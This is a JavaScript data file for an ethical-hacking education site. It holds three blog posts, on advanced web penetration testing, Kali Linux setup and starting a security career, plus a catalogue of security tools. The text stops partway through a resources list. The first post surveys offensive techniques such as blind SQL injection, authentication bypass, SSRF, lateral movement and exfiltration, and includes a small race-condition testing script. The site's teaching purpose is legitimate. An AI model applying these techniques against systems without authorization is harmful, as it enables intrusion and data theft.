// Global data store for the static website
export const globalData = {
  // Site configuration
  siteConfig: {
    name: "Universe of Hacking",
    description:
      "Your gateway to cybersecurity mastery. Learn, practice, and excel in ethical hacking with our comprehensive platform.",
    author: "Universe of Hacking Team",
    social: {
      discord: "https://discord.gg/universeofhacking",
      telegram: "https://t.me/universeofhacking",

      twitter: "https://twitter.com/0xUoH",
    },
  },


 
  // Blog posts data
  blogs: [
    {
      id: "1",
      title: "Advanced Web Application Penetration Testing Techniques",
      slug: "advanced-web-app-penetration-testing",
      excerpt:
        "Learn advanced techniques for testing web applications and finding critical vulnerabilities that automated scanners miss.",
      content: `# Advanced Web Application Penetration Testing Techniques

Web application penetration testing is a critical skill for any cybersecurity professional. In this comprehensive guide, we'll explore advanced techniques that go beyond basic vulnerability scanning.

## Manual Testing Approaches

### 1. Business Logic Flaws
Business logic vulnerabilities are often the most critical yet hardest to detect. These flaws occur when the application's workflow can be manipulated to perform unintended actions.

**Common Examples:**
- Price manipulation in e-commerce applications
- Privilege escalation through parameter tampering
- Race conditions in financial transactions
- Workflow bypass vulnerabilities

### 2. Advanced SQL Injection
While basic SQL injection is well-known, advanced techniques like:
- **Boolean-based blind SQL injection**: Extracting data through true/false responses
- **Time-based blind SQL injection**: Using database delays to extract information
- **Second-order SQL injection**: Payloads that execute in different contexts
- **NoSQL injection**: Targeting MongoDB, CouchDB, and other NoSQL databases

### 3. Authentication Bypass Techniques
- **Session fixation attacks**: Forcing users to use attacker-controlled session IDs
- **JWT token manipulation**: Exploiting weak signing algorithms or key confusion
- **OAuth flow exploitation**: Manipulating authorization flows for account takeover
- **Multi-factor authentication bypass**: Exploiting implementation flaws

## Advanced Tools and Techniques

### Burp Suite Extensions
- **Autorize**: Automated authorization testing across different user roles
- **Param Miner**: Discovery of hidden parameters and headers
- **Turbo Intruder**: Advanced fuzzing with custom Python scripts
- **Collaborator**: Out-of-band interaction testing

### Custom Scripts and Automation
Writing custom Python scripts for specific test cases can often reveal vulnerabilities that automated tools miss.

\`\`\`python
import requests
import threading

def test_race_condition(url, payload):
    def send_request():
        response = requests.post(url, data=payload)
        print(f"Status: {response.status_code}")
    
    threads = []
    for i in range(10):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
\`\`\`

### Server-Side Request Forgery (SSRF)
- **Internal network scanning**: Using SSRF to map internal infrastructure
- **Cloud metadata exploitation**: Accessing AWS/Azure metadata services
- **Protocol smuggling**: Exploiting HTTP request smuggling vulnerabilities

## Advanced Exploitation Techniques

### Client-Side Attacks
- **DOM-based XSS**: Exploiting client-side JavaScript vulnerabilities
- **Prototype pollution**: Manipulating JavaScript object prototypes
- **PostMessage vulnerabilities**: Exploiting cross-origin communication

### Server-Side Attacks
- **Template injection**: Exploiting server-side template engines
- **Deserialization attacks**: Exploiting unsafe object deserialization
- **XXE (XML External Entity)**: Exploiting XML parsers for data exfiltration

## Methodology and Approach

### Information Gathering
1. **Passive reconnaissance**: OSINT, DNS enumeration, certificate transparency
2. **Active scanning**: Port scanning, service enumeration, technology identification
3. **Application mapping**: Spidering, endpoint discovery, parameter analysis

### Vulnerability Assessment
1. **Automated scanning**: Using tools like Burp, OWASP ZAP, Nessus
2. **Manual testing**: Logic flaws, business process analysis
3. **Code review**: Static analysis when source code is available

### Exploitation and Post-Exploitation
1. **Proof of concept development**: Demonstrating impact
2. **Privilege escalation**: Gaining higher-level access
3. **Lateral movement**: Exploring connected systems
4. **Data exfiltration**: Demonstrating data access capabilities

## Best Practices and Ethics

### Legal and Ethical Considerations
- **Always obtain proper authorization** before testing
- **Follow responsible disclosure practices**
- **Document everything** for legal protection
- **Respect scope limitations** and rules of engagement

### Reporting and Communication
- **Executive summary**: High-level findings for management
- **Technical details**: Detailed steps for remediation teams
- **Risk assessment**: Business impact and likelihood ratings
- **Remediation guidance**: Specific steps to fix vulnerabilities

## Staying Current

### Continuous Learning
- **Follow security researchers** on Twitter and blogs
- **Participate in bug bounty programs** like HackerOne, Bugcrowd
- **Attend security conferences** like DEF CON, Black Hat, BSides
- **Practice on platforms** like Hack The Box, TryHackMe, PortSwigger Academy

### Building Your Lab
- **Vulnerable applications**: DVWA, WebGoat, Mutillidae
- **Capture The Flag platforms**: PicoCTF, OverTheWire
- **Cloud environments**: AWS, Azure, GCP security challenges

## Conclusion

Advanced web application penetration testing requires a deep understanding of both technical vulnerabilities and business logic. The key is to think like an attacker while maintaining the ethics of a security professional.

Remember: The goal isn't just to find vulnerabilities, but to help organizations improve their overall security posture. Every test should provide actionable insights that make the digital world a safer place.

**Happy hacking, and stay ethical! 🛡️**`,
      author: "0xBinaryOrbit",
      createdAt: "2025-01-15",
      updatedAt: "2025-01-15",
      tags: [
        "Web Security",
        "Penetration Testing",
        "SQL Injection",
        "Authentication",
        "Advanced",
      ],
      category: "Advanced Tutorials",
      thumbnail:
        "/placeholder.svg?height=400&width=600&text=Advanced+Web+Penetration+Testing",
      readTime: "15 min",
      difficulty: "Advanced",
      likes: 342,
      views: 2150,
      featured: true,
    },
    {
  "id": "2",
  "title": "Complete Kali Linux 2025.2 VirtualBox Setup Guide",
  "slug": "kali-linux-2025-virtualbox-guide",
  "excerpt": "Step-by-step tutorial for installing and configuring Kali Linux 2025.2 in VirtualBox for penetration testing and ethical hacking.",
  "content": `# Complete Kali Linux 2025.2 VirtualBox Setup Guide

Kali Linux remains the industry standard for penetration testing and security research. This guide will walk you through the entire process of setting up Kali Linux 2025.2 in VirtualBox with optimal configurations for security testing.

## Why Kali Linux in VirtualBox?

VirtualBox provides an isolated, portable testing environment that:
- Protects your host machine from accidental damage
- Allows snapshot rollbacks to clean states
- Enables easy sharing of configured environments
- Supports multiple network configurations for testing

## Prerequisites

### Hardware Requirements
- **CPU**: 64-bit processor with VT-x/AMD-V support
- **RAM**: Minimum 4GB (8GB recommended)
- **Storage**: 25GB free space (SSD recommended)
- **VirtualBox**: Version 7.0 or newer

### Download Options
1. **Pre-built VirtualBox image** (.ova) - Fastest setup
2. **ISO installer** - More customization
3. **Light edition** - For resource-constrained systems

## Step 1: Obtaining Kali Linux 2025.2

### Official Sources
1. Visit [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
2. Select **VirtualBox Images** under "Pre-Built Virtual Machines"
3. Choose between:
   - **Kali Linux 2025.2 VirtualBox 64-bit** (Standard)
   - **Kali Linux 2025.2 Light VirtualBox 64-bit** (Minimal tools)



## Step 2: Create Kali Linux VirtualBox Instance
Create a new virtual machine and configure it to run Kali Linux. Proceed with the steps below to correctly set up a Kali Linux VM in VirtualBox:

1. **Launch VirtualBox Manager** and click the New icon.

![VirtualBox Manager](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*PFLN7LcXf36lLyS5.png)

2. **Specify a name** for the VM and provide the path to the ISO image. Select Next.

![VM Name and ISO](https://miro.medium.com/v2/resize:fit:4800/format:webp/0*7tcvwIkdDIs6DpBP.png)

3. **Allocate resources**:
   - Memory: Minimum 2GB RAM (4GB recommended)
   - CPUs: 1 minimum (2 recommended)
   Select Next when finished.

![VM Hardware Allocation](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*rsa5LVzvl6CDfZnu.png)

4. **Create virtual hard disk**:
   - Size: Minimum 25GB
   - Type: VDI (VirtualBox Disk Image)
   - Storage: Dynamically allocated
   Click Next to proceed.

![Virtual Hard Disk](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*O91PCpmdc3OXlUwe.png)

5. **Review settings** on the Summary page and select Finish.

![VM Summary](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*IU3AtNdyNmXw82WD.png)

The VM now appears in VirtualBox Manager.

## Step 3: Configure Virtual Machine Settings

1. Select the Kali Linux VM and click **Settings**.

![VM Settings](https://miro.medium.com/v2/resize:fit:4800/format:webp/0*hwLocjvyt58BZeSo.png)

2. Under **Advanced** tab:
   - Shared Clipboard: Bidirectional
   - Drag'n'Drop: Bidirectional

![Shared Clipboard Settings](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*CbOEl2B1b03w5WQ-.png)

3. **Network Settings**:
   - Attached to: Bridged Adapter
   - Promiscuous Mode: Allow All

![Network Configuration](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*uiw6VrRkMaQz1SUG.png)

4. Click **Start** to begin installation.

![Start VM](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*mocjqbR9rb4cgVE5.png)

## Kali Linux Installation Process

### Step 1: Initial Configuration
1. Select **Graphical install**
2. Choose language, country, and keyboard layout

### Step 2: System Configuration
1. **Hostname**: Enter a name (e.g., kali-vm)
![System Hostname](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*Vu9bIrTpq4Wy-dKI.png)
2. **Domain**: Leave blank if not needed
3. Create user account with strong password
![Strong Password](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*2oHcp4Bw6_bm3zpP.png)
4. Select time zone



### Step 3: Disk Partitioning
1. Select **Guided - use entire disk**
![Entire Disk Partitioning](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*RnSRKFg83nsg3-wK.png)
2. Choose the virtual disk
3. Select **All files in one partition**
4. Confirm changes

![Confirm changes](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*BMYrJ5ddgW-cL04o.png)

### Step 4: Customize Kali Linux Installation
After installing the system’s core, Kali enables users to customize the OS further. Choose the components to install by executing the following steps:

1. Select the desktop environment and the tools you want, or click Continue to proceed with the default options.
  ![Default Options](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*tIfhDdkLAJjf8D4_.png)
2. Select whether you want to use a network mirror.
3. If you use an HTTP proxy, enter the necessary information. Otherwise, leave the field blank.
4. Install the GRUB bootloader on the hard disk. Select Yes and Continue.
5. Select a bootloader device to ensure the newly installed system is bootable.
![GRUB Bootloader](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*Hk3cw68lEynDmbDe.png)
When Kali finishes installing, the Installation is complete message appears.
6. Click Continue to reboot your VM. After rebooting, the Kali login screen appears.
7. Enter the username and password created in the previous steps.

The Kali Linux desktop appears on the screen.

## Using Pre-Built VirtualBox Image
A quick way to run a Kali Linux VM is by using a pre-built VirtualBox image. The section below explains how to obtain and start a pre-built Kali Linux image on VirtualBox.

1. Download the **pre-built VM** from [Kali Linux website](https://www.kali.org/get-kali/)
![Pre-built VM Download](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*sXQ1cCMXHM4m9Wvb.png)
3. Wait for the 7z file to download, then unpack it to a directory of your choice.
4. Open VirtualBox Manager and select the Add button in the top menu.
![Click Add Button](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*ZQgtdW_wEGuaL1Ju.png)
5. Locate the virtual machine file you downloaded and unpacked. Double-click the file to open it.
![Select VM File](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*5WgNF9JuQMOKqglT.png)
A Kali Linux VM instance appears in the menu on the left side of the screen.
6. Select the instance and click the Start button in the top menu.
![Start Pre-built VM](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*-M-n-Dl2QGKoaYQK.png)
Wait for the system to boot up.
7. On the login screen, use username kali and password kali to log in.

Note: You can create a new user within Kali Linux.



## Conclusion

You now have a fully configured Kali Linux 2025.2 environment in VirtualBox ready for security testing. Remember to:

✔ Always test only authorized systems  
✔ Maintain regular snapshots  
✔ Keep your tools updated  
✔ Document your testing procedures  

For official documentation and community support, visit:
- [https://www.kali.org/docs/](https://www.kali.org/docs/)
- [https://forums.kali.org/](https://forums.kali.org/)

**Happy ethical hacking!** 🚀`,
  "author": "0xBinaryOrbit",
  "createdAt": "2025-08-8",
  "updatedAt": "2025-08-8",
  "tags": [
    "Kali Linux",
    "VirtualBox",
    "Penetration Testing",
    "Setup Guide",
    "Security"
  ],
  "category": "Tutorials",
  "thumbnail": "/placeholder.svg?height=400&width=600&text=Kali+Linux+2025+Setup",
  "readTime": "12 min",
  "difficulty": "Intermediate",
  "likes": 287,
  "views": 1950,
  "featured": true
},
      
      {
      id: "3",
      title: "Kickstarting Your Journey in Ethical Hacking",
      slug: "kickstart-your-ethical-hacking-journey",
      excerpt:
        "Begin your ethical hacking career with this comprehensive guide — understand the mindset, tools, and pathways to becoming a skilled cybersecurity professional.",
      content: `# Kickstarting Your Journey in Ethical Hacking

The world of cybersecurity is vast, exciting, and constantly evolving. Whether you're a student, developer, or tech enthusiast, ethical hacking offers a unique and rewarding career path.

## What is Ethical Hacking?

Ethical hacking is the practice of legally breaking into computers and devices to test an organization's defenses. These "white-hat" hackers help find and fix security vulnerabilities before malicious hackers can exploit them.

### The Ethical Hacker's Mindset
- **Curiosity**: Always asking "what if?" and "how does this work?"
- **Persistence**: Not giving up when the first approach doesn't work
- **Responsibility**: Understanding the power you wield and using it ethically
- **Continuous learning**: Staying updated with the latest threats and defenses

## Why Learn Ethical Hacking?

### Career Opportunities
- **High demand**: Organizations desperately need security experts to safeguard digital assets
- **Competitive salaries**: Cybersecurity professionals command premium wages
- **Job security**: As long as technology exists, security will be needed
- **Remote work**: Many cybersecurity roles offer flexible work arrangements

### Personal Growth
- **Continuous learning**: New vulnerabilities and exploits emerge daily, keeping you sharp
- **Problem-solving**: Each security challenge is a unique puzzle to solve
- **Impactful work**: Protect users and systems from real-world threats
- **Community**: Join a global community of security professionals

### Fun and Engagement
- **CTFs and competitions**: Learn and grow by solving challenges
- **Bug bounties**: Get paid for finding vulnerabilities in real applications
- **Research opportunities**: Discover new attack vectors and defense mechanisms

## Essential Skills You Need

### 1. Networking Fundamentals
Understanding how data flows across networks is crucial:
- **IP addresses and subnetting**: How devices communicate
- **Protocols**: TCP/IP, HTTP/HTTPS, DNS, DHCP, and more
- **Network devices**: Routers, switches, firewalls, and their configurations
- **Packet analysis**: Understanding network traffic patterns

### 2. Operating Systems (Linux Preferred)
Most security tools run on Linux:
- **Command line proficiency**: Navigate and manipulate files efficiently
- **System administration**: User management, permissions, services
- **Scripting**: Bash scripting for automation
- **Kali Linux**: The go-to distribution for penetration testing

### 3. Programming Basics
Code understanding accelerates your learning:
- **Python**: Perfect for scripting and automation
- **JavaScript**: Essential for web application security
- **SQL**: Database queries and injection techniques
- **PowerShell**: Windows environment exploitation

### 4. Web Technologies
Most vulnerabilities exist in web applications:
- **HTML/CSS**: Understanding web page structure
- **HTTP protocol**: Requests, responses, headers, cookies
- **APIs**: RESTful services and GraphQL
- **Databases**: SQL and NoSQL database interactions

## Essential Tools of the Trade

### Operating System
- **Kali Linux**: Preloaded with 600+ security tools
- **Parrot Security OS**: Alternative to Kali with additional privacy features
- **BlackArch**: Arch-based penetration testing distribution

### Web Application Testing
- **Burp Suite**: Industry-standard web vulnerability scanner and proxy
- **OWASP ZAP**: Free alternative to Burp Suite
- **Nikto**: Web server scanner for vulnerabilities
- **SQLMap**: Automated SQL injection testing tool

### Network Analysis
- **Nmap**: Network scanning and enumeration
- **Wireshark**: Packet analysis and network troubleshooting
- **Masscan**: High-speed port scanner
- **Netcat**: Network debugging and exploration tool

### Exploitation Frameworks
- **Metasploit**: Comprehensive exploitation framework
- **Cobalt Strike**: Advanced threat emulation platform
- **Empire**: PowerShell post-exploitation framework

## Learning Pathways to Get Started

### 1. Free Learning Resources

**YouTube Channels:**
- **LiveOverflow**: Excellent for understanding vulnerabilities
- **IppSec**: Hack The Box walkthroughs and techniques
- **The Cyber Mentor**: Comprehensive ethical hacking tutorials
- **John Hammond**: CTF solutions and security concepts

**Websites and Blogs:**
- **OWASP**: Web application security knowledge base
- **PortSwigger Web Security Academy**: Free web security training
- **Cybrary**: Free cybersecurity courses
- **GitHub repositories**: Thousands of security tools and resources

### 2. Hands-On Practice Platforms

**Beginner-Friendly:**
- **TryHackMe**: Guided learning paths with virtual machines
- **Cybrary**: Structured courses with hands-on labs
- **VulnHub**: Downloadable vulnerable VMs
- **DVWA**: Damn Vulnerable Web Application for practice

**Intermediate to Advanced:**
- **Hack The Box**: Realistic penetration testing scenarios
- **OverTheWire**: Wargames for learning security concepts
- **Root-Me**: Challenges across multiple security domains
- **PentesterLab**: Web application security exercises

### 3. Capture The Flag (CTFs)

CTFs are like playgrounds for hackers. Compete solo or with teams to solve real-world problems in categories like:

**CTF Categories:**
- **Web Exploitation**: Finding vulnerabilities in web applications
- **Reverse Engineering**: Analyzing malware and binaries
- **Cryptography**: Breaking encryption and encoding schemes
- **Forensics**: Investigating digital evidence
- **Binary Exploitation**: Buffer overflows and memory corruption
- **OSINT**: Open source intelligence gathering

**Popular CTF Platforms:**
- **CTFtime.org**: Calendar of upcoming CTF events
- **PicoCTF**: Beginner-friendly CTF with permanent challenges
- **CyberTalents**: Middle Eastern focus with regular competitions

### 4. Professional Certifications

**Entry Level:**
- **CompTIA Security+**: Foundation security knowledge
- **CompTIA PenTest+**: Introduction to penetration testing
- **eJPT** (eLearnSecurity Junior Penetration Tester): Hands-on beginner cert

**Intermediate:**
- **CEH** (Certified Ethical Hacker): Broad ethical hacking knowledge
- **GCIH** (GIAC Certified Incident Handler): Incident response focus
- **CySA+**: Cybersecurity analyst certification

**Advanced:**
- **OSCP** (Offensive Security Certified Professional): Hands-on penetration testing
- **CISSP**: Management-level security certification
- **CISM**: Information security management

## Building Your Learning Environment

### Home Lab Setup
1. **Virtualization software**: VMware Workstation or VirtualBox
2. **Kali Linux VM**: Your primary attack platform
3. **Vulnerable VMs**: Metasploitable, DVWA, WebGoat
4. **Windows VMs**: For testing Windows-specific attacks
5. **Network simulation**: GNS3 or Packet Tracer for network labs

### Cloud-Based Learning
- **AWS/Azure free tiers**: Practice cloud security
- **GitHub Codespaces**: Browser-based development environment
- **Online labs**: TryHackMe, Hack The Box Academy

## Join the Community

### Online Communities
- **Reddit**: r/netsec, r/AskNetsec, r/cybersecurity
- **Discord servers**: Many cybersecurity communities
- **Twitter**: Follow security researchers and practitioners
- **LinkedIn**: Professional networking and job opportunities

### Local Meetups and Conferences
- **DEF CON**: The world's largest hacker conference
- **BSides**: Local security conferences worldwide
- **2600 meetings**: Hacker meetups in many cities
- **OWASP chapters**: Web application security focus

### Our Platform - Universe of Hacking

You're not alone in this journey! Our platform is built by hackers, for hackers. Here, you'll find:

- ✅ **Weekly blog updates** with the latest techniques and tutorials
- ✅ **CTF event calendar** to never miss a competition
- ✅ **Comprehensive tools library** with reviews and tutorials
- ✅ **Learning paths** from beginner to advanced content
- ✅ **Active community** on Telegram and Discord
- ✅ **Job board** with cybersecurity opportunities
- ✅ **Expert-led workshops** and webinars

## Creating Your Learning Plan

### Month 1-2: Foundations
- Set up your lab environment
- Learn Linux command line basics
- Understand networking fundamentals
- Complete TryHackMe beginner paths

### Month 3-4: Web Application Security
- Learn HTML, HTTP, and web technologies
- Practice with DVWA and WebGoat
- Start using Burp Suite
- Participate in your first CTF

### Month 5-6: Network Security
- Master Nmap and network scanning
- Learn Wireshark for packet analysis
- Practice with Metasploitable
- Join online communities and forums

### Month 7-12: Specialization
- Choose your focus area (web apps, networks, mobile, etc.)
- Start bug bounty hunting
- Consider certification preparation
- Build your professional network

## Common Beginner Mistakes to Avoid

### Technical Mistakes
- **Jumping to tools too quickly**: Understand the fundamentals first
- **Not documenting your learning**: Keep detailed notes and screenshots
- **Ignoring the legal aspects**: Always get permission before testing
- **Focusing only on exploitation**: Learn defense and mitigation too

### Career Mistakes
- **Not networking**: The cybersecurity community is incredibly helpful
- **Perfectionism**: You don't need to know everything before starting
- **Comparing yourself to others**: Everyone learns at their own pace
- **Neglecting soft skills**: Communication is crucial in cybersecurity

## Final Thoughts

Don't wait for the "perfect time" to start — the best time to start is **now**. Ethical hacking isn't just about memorizing tools or commands — it's about developing a security mindset and thinking like both an attacker and defender.

### Key Principles to Remember:
1. **Stay curious**: Always ask questions and dig deeper
2. **Be persistent**: Most breakthroughs come after multiple failures
3. **Stay ethical**: With great power comes great responsibility
4. **Keep learning**: The field evolves rapidly, and so must you
5. **Give back**: Help others as you grow in your journey

### Your Next Steps:
1. **Set up your lab environment** this week
2. **Join our Discord community** to connect with fellow learners
3. **Start with TryHackMe** or similar beginner platforms
4. **Document your journey** through blogs or social media
5. **Set a goal** for your first CTF participation

Welcome to the Universe of Hacking! 🛡️

*The journey of a thousand exploits begins with a single vulnerability. Let's start hacking!*

---

**Ready to dive deeper?** Check out our other tutorials on specific topics, join our weekly CTF challenges, and connect with our community of ethical hackers. Remember, we're here to support you every step of the way.

*Join us. Learn. Hack. Repeat.*`,
      author: "0xBinaryOrbit",
      createdAt: "2025-01-23",
      updatedAt: "2025-01-23",
      tags: ["Getting Started", "Ethical Hacking", "CTF", "Beginner", "Career"],
      category: "Getting Started",
      thumbnail:
        "/placeholder.svg?height=400&width=600&text=Ethical+Hacking+Journey",
      readTime: "12 min",
      difficulty: "Beginner",
      likes: 189,
      views: 1420,
      featured: true,
    },
  
  ],

  // Security tools data
  tools: [
    {
      id: "1",
      name: "Burp Suite",
      description:
        "Comprehensive web application security testing platform with advanced scanning capabilities and manual testing tools.",
      category: "Web Security",
      url: "https://portswigger.net/burp",
      githubLink: null,
      tags: ["Web Testing", "Proxy", "Scanner", "Professional"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Web vulnerability scanner",
        "Intercepting proxy",
        "Application security testing",
        "Manual testing tools",
        "Extensible platform",
      ],
    },
    {
      id: "2",
      name: "Metasploit Framework",
      description:
        "Penetration testing platform for developing and executing exploit code against remote targets.",
      category: "Penetration Testing",
      url: "https://www.metasploit.com",
      githubLink: "https://github.com/rapid7/metasploit-framework",
      tags: ["Exploitation", "Payloads", "Post-exploitation"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Exploit development",
        "Payload generation",
        "Post-exploitation modules",
        "Automated testing",
        "Integration with other tools",
      ],
    },
    {
      id: "3",
      name: "Nmap",
      description:
        "Network discovery and security auditing tool for identifying hosts and services on a network.",
      category: "Network Security",
      url: "https://nmap.org",
      githubLink: null,
      tags: ["Network Scanner", "Port Scanner", "Discovery"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Host discovery",
        "Port scanning",
        "Service detection",
        "OS fingerprinting",
        "Scriptable interaction",
      ],
    },
    {
      id: "4",
      name: "Wireshark",
      description:
        "Network protocol analyzer for troubleshooting, analysis, and protocol development.",
      category: "Network Security",
      url: "https://www.wireshark.org",
      githubLink: "https://github.com/wireshark/wireshark",
      tags: ["Packet Analysis", "Network Monitoring", "Forensics"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Deep packet inspection",
        "Live capture",
        "Rich display filters",
        "Protocol decryption",
        "Custom protocol support",
      ],
    },
    {
      id: "5",
      name: "Kali Linux",
      description:
        "Penetration testing and security auditing Linux distribution with hundreds of pre-installed tools.",
      category: "Penetration Testing",
      url: "https://www.kali.org",
      githubLink: null,
      tags: ["OS", "Security Tools", "Forensics"],
      platform: ["Linux"],
      features: [
        "Pre-installed security tools",
        "Custom kernel",
        "Forensic mode",
        "Wireless device support",
        "Customizable environment",
      ],
    },
    {
      id: "6",
      name: "OWASP ZAP",
      description:
        "Open-source web application security scanner for finding vulnerabilities in web apps.",
      category: "Web Security",
      url: "https://www.zaproxy.org",
      githubLink: "https://github.com/zaproxy/zaproxy",
      tags: ["Web Scanner", "Proxy", "Automated Testing"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Automated scanner",
        "Intercepting proxy",
        "REST API",
        "Authentication support",
        "Plug-in architecture",
      ],
    },
    {
      id: "7",
      name: "John the Ripper",
      description:
        "Password cracking tool for detecting weak Unix and Windows passwords.",
      category: "Password Security",
      url: "https://www.openwall.com/john",
      githubLink: "https://github.com/openwall/john",
      tags: ["Password Cracking", "Brute Force", "Dictionary Attack"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Multiple hash types",
        "Custom wordlists",
        "Brute-force modes",
        "Distributed cracking",
        "Rule-based attacks",
      ],
    },
    {
      id: "8",
      name: "Hashcat",
      description:
        "Advanced password recovery tool supporting multiple hash algorithms and attack modes.",
      category: "Password Security",
      url: "https://hashcat.net/hashcat",
      githubLink: "https://github.com/hashcat/hashcat",
      tags: ["GPU Acceleration", "Password Cracking", "Brute Force"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "GPU acceleration",
        "Multiple hash types",
        "Rule-based attacks",
        "Distributed cracking",
        "Performance monitoring",
      ],
    },
    {
      id: "9",
      name: "Snort",
      description:
        "Open-source network intrusion detection and prevention system.",
      category: "Network Security",
      url: "https://www.snort.org",
      githubLink: "https://github.com/snort3/snort3",
      tags: ["IDS", "IPS", "Network Monitoring"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Real-time traffic analysis",
        "Protocol analysis",
        "Content matching",
        "Preprocessor system",
        "Rule-based detection",
      ],
    },
    {
      id: "10",
      name: "Ghidra",
      description:
        "Software reverse engineering framework developed by NSA's Research Directorate.",
      category: "Reverse Engineering",
      url: "https://ghidra-sre.org",
      githubLink: "https://github.com/NationalSecurityAgency/ghidra",
      tags: ["Disassembler", "Decompiler", "Debugger"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Disassembly",
        "Decompilation",
        "Graphing",
        "Scriptable",
        "Collaborative analysis",
      ],
    },
    {
      id: "11",
      name: "Cuckoo Sandbox",
      description:
        "Automated malware analysis system for detecting and analyzing malicious files.",
      category: "Malware Analysis",
      url: "https://cuckoosandbox.org",
      githubLink: "https://github.com/cuckoosandbox/cuckoo",
      tags: ["Sandbox", "Malware", "Behavior Analysis"],
      platform: ["Windows", "Linux"],
      features: [
        "Automated analysis",
        "Behavioral analysis",
        "Memory analysis",
        "Network traffic capture",
        "Custom reporting",
      ],
    },
    {
      id: "12",
      name: "The Sleuth Kit (TSK)",
      description:
        "Forensic toolkit for analyzing disk images and recovering files from digital evidence.",
      category: "Digital Forensics",
      url: "https://www.sleuthkit.org",
      githubLink: "https://github.com/sleuthkit/sleuthkit",
      tags: ["Forensics", "Disk Analysis", "File Recovery"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "File system analysis",
        "Timeline generation",
        "Hash filtering",
        "Keyword searching",
        "Image file support",
      ],
    },
    {
      id: "13",
      name: "Aircrack-ng",
      description:
        "Suite of tools for assessing WiFi network security and cracking WEP/WPA keys.",
      category: "Wireless Security",
      url: "https://www.aircrack-ng.org",
      githubLink: "https://github.com/aircrack-ng/aircrack-ng",
      tags: ["WiFi", "Packet Injection", "Cracking"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Packet capture",
        "WEP/WPA cracking",
        "Packet injection",
        "Network detection",
        "Handshake capture",
      ],
    },
    {
      id: "14",
      name: "Maltego",
      description:
        "Interactive data mining tool for link analysis and gathering open-source intelligence.",
      category: "OSINT",
      url: "https://www.maltego.com",
      githubLink: null,
      tags: ["Reconnaissance", "Data Visualization", "Entity Mapping"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Entity relationship mapping",
        "Data aggregation",
        "Transform hub",
        "Custom transforms",
        "Visual investigation",
      ],
    },
    {
      id: "15",
      name: "Immunity Debugger",
      description:
        "Powerful debugger for analyzing malware and reverse engineering binaries.",
      category: "Reverse Engineering",
      url: "https://www.immunityinc.com/products/debugger",
      githubLink: null,
      tags: ["Debugger", "Malware Analysis", "Exploit Development"],
      platform: ["Windows"],
      features: [
        "Python scripting",
        "Graphical analysis",
        "Shellcode analysis",
        "Memory inspection",
        "Vulnerability research",
      ],
    },
    {
      id: "16",
      name: "Volatility",
      description:
        "Advanced memory forensics framework for incident response and malware analysis.",
      category: "Memory Forensics",
      url: "https://www.volatilityfoundation.org",
      githubLink: "https://github.com/volatilityfoundation/volatility",
      tags: ["Memory Analysis", "Incident Response", "Malware"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Memory dump analysis",
        "Process inspection",
        "Network connections",
        "Registry analysis",
        "Plugin architecture",
      ],
    },
    {
      id: "17",
      name: "OpenVAS",
      description:
        "Full-featured vulnerability scanner for comprehensive network security auditing.",
      category: "Vulnerability Assessment",
      url: "https://openvas.org",
      githubLink: "https://github.com/greenbone/openvas-scanner",
      tags: [
        "Vulnerability Scanning",
        "Network Assessment",
        "Security Auditing",
      ],
      platform: ["Windows", "Linux"],
      features: [
        "Daily updated feeds",
        "Comprehensive testing",
        "Scheduled scans",
        "Detailed reporting",
        "Custom policies",
      ],
    },
    {
      id: "18",
      name: "IDA Pro",
      description:
        "Interactive disassembler and debugger for reverse engineering and malware analysis.",
      category: "Reverse Engineering",
      url: "https://www.hex-rays.com/products/ida",
      githubLink: null,
      tags: ["Disassembler", "Debugger", "Binary Analysis"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Interactive disassembly",
        "Graphical views",
        "Scriptable interface",
        "Cross-platform debugging",
        "Plugin support",
      ],
    },
    {
      id: "19",
      name: "Splunk",
      description:
        "Platform for searching, monitoring, and analyzing machine-generated big data.",
      category: "SIEM",
      url: "https://www.splunk.com",
      githubLink: null,
      tags: ["Log Analysis", "Security Monitoring", "Incident Response"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "Real-time monitoring",
        "Advanced analytics",
        "Custom dashboards",
        "Alerting system",
        "Machine learning",
      ],
    },
    {
      id: "20",
      name: "BloodHound",
      description:
        "Active Directory security analysis tool for identifying attack paths in AD environments.",
      category: "Active Directory Security",
      url: "https://bloodhound.readthedocs.io",
      githubLink: "https://github.com/BloodHoundAD/BloodHound",
      tags: ["Active Directory", "Attack Paths", "Graph Analysis"],
      platform: ["Windows", "Linux", "macOS"],
      features: [
        "AD relationship mapping",
        "Attack path visualization",
        "Privilege escalation detection",
        "Custom queries",
        "Data export",
      ],
    },
  ],

  // Learning resources data
  resources: [
    {
    "id": "pe-1",
    "title": "4 Ways get linux privilege escalation",
    "description": "shows different examples of PE",
    "type": "Article",
    "category": "Privilege Escalation",
